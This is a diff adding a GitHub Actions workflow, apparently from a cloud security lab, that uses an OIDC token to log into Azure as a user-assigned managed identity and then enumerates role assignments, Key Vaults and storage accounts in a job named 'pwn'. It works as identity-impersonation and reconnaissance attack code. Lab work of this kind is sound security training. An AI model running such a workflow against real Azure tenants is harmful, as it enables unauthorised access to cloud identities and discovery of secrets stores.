@@ -1,0 +1,40 @@
+name: Impersonate Azure UAMI via OIDC
+
+on:
+  workflow_dispatch:  # Trigger manually
+
+permissions:
+  id-token: write     # 🟢 REQUIRED for OIDC!
+  contents: read
+
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+
+    - name: Authenticate to Azure as UAMI
+      uses: azure/login@v1
+      with:
+        client-id: c265ea2a-1235-446d-bd74-5d8228c904b1       # From your UAMI
+        tenant-id: fdd066e1-ee37-49bc-b08f-d0e152119b04       # From UAMI or your account
+        allow-no-subscriptions: true
+
+    - name: Show token info
+      run: |
+        az account show
+        az identity show --name iam-azure-lab-3-identity --resource-group iam-azure-labs
+
+    - name: Enumerate role assignments
+      run: |
+        echo "[*] Roles assigned to this identity:"
+        az role assignment list --all --output table
+
+    - name: Enumerate Key Vaults
+      run: |
+        echo "[*] Attempting Key Vault enumeration..."
+        az keyvault list --output table || true
+
+    - name: Enumerate Storage
+      run: |
+        echo "[*] Attempting storage account enumeration..."
+        az storage account list --output table || true
